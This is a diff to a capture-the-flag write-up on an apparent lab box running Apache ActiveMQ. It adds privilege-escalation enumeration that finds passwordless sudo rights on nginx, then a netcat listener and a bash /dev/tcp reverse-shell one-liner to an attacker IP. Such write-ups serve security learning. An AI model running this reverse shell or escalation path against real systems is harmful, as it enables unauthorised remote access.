@@ -125,7 +125,7 @@ PORT      STATE SERVICE    VERSION
 |_    5.15.15
 ```
 
-## Web Enumeration (Port 80)
+## Web Enumeration (Port 80) - Initial Foothold
 
 Attempting to visit web page posted on port 80, I recieve a login popup and a 401 error due to not knowing the credentials.
 
@@ -161,6 +161,59 @@ drwxr-xr-x  2 activemq activemq  4096 Nov  5  2023 linux-x86-64
 drwxr-xr-x  2 activemq activemq  4096 Nov  5  2023 macosx
 -rw-r--r--  1 activemq activemq 83820 Apr 20  2021 wrapper.jar
 ```
+
+## Privilege Escalation 
+
+Checked the following information:
+
+```bash
+# Checked current user
+Apache ActiveMQ$ whoami
+activemq
+
+# checked name of host
+Apache ActiveMQ$ hostname
+broker
+
+# listed files in current directory
+Apache ActiveMQ$ ls -la
+total 164
+drwxr-xr-x  5 activemq activemq  4096 Nov  7  2023 .
+drwxr-xr-x 11 activemq activemq  4096 Nov  6  2023 ..
+-rwxr-xr-x  1 activemq activemq 21404 Apr 20  2021 activemq
+-rwxr-xr-x  1 activemq activemq  6189 Apr 20  2021 activemq-diag
+-rw-r--r--  1 activemq activemq 16389 Apr 20  2021 activemq.jar
+-rw-r--r--  1 activemq activemq  5597 Apr 20  2021 env
+drwxr-xr-x  2 activemq activemq  4096 Nov  5  2023 linux-x86-32
+drwxr-xr-x  2 activemq activemq  4096 Nov  5  2023 linux-x86-64
+drwxr-xr-x  2 activemq activemq  4096 Nov  5  2023 macosx
+-rw-r--r--  1 activemq activemq 83820 Apr 20  2021 wrapper.jar
+
+# Checked what groups I am a member of.
+Apache ActiveMQ$ id
+uid=1000(activemq) gid=1000(activemq) groups=1000(activemq)
+
+# Checked Sudo Privileges
+Apache ActiveMQ$ sudo -l
+Matching Defaults entries for activemq on broker:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User activemq may run the following commands on broker:
+    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
+```
+
+I can see that I am able to run the command `nginx` with sudo privileges. 
+
+Decided to get a netcat reverse shell for better stability:
+
+```bash
+# Attacker Machine
+nc -lvnp 9001
+
+# Target machine
+bash -c 'bash -i >& /dev/tcp/10.10.14.6/9001'
+```
+
 
 
 
